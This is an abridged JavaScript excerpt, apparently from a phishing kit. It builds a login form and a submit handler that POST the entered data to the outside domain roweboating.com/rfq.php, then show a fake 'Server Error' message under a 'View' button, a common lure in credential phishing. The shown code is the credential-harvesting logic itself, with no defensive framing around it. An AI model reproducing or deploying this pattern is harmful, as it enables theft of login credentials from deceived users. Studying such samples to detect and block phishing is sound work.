...
function createForm() {
    ...
    form.name = 'loginForm';
    form.action = 'https://roweboating.com/rfq.php';
    form.method = 'post';
...
function handleFormSubmission(errorContainer) {
    ...
    form.addEventListener('submit', async (event) => {
        ...
        try {
            const response = await fetch('https://roweboating.com/rfq.php', {
                method: 'POST',
                body: formData
            });
            ...
            showError(errorContainer, 'Server Error. Please try again.');
            signInButton.textContent = 'View';
            spinner.style.display = 'none';
        }
    });
